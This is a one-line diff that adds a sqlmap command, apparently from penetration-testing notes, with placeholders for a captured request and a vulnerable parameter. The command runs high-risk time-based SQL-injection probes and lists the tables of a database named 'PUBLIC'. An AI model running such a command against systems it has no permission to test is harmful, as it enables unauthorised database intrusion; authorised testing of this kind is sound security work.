@@ -1,0 +1,2 @@
+python sqlmap.py -r <REQUEST FILE> -p <VULNERABLE FIELD> --param-del="&" --risk=3 --time-sec=3 -D 'PUBLIC' --tables --no-escape --flush-session
+
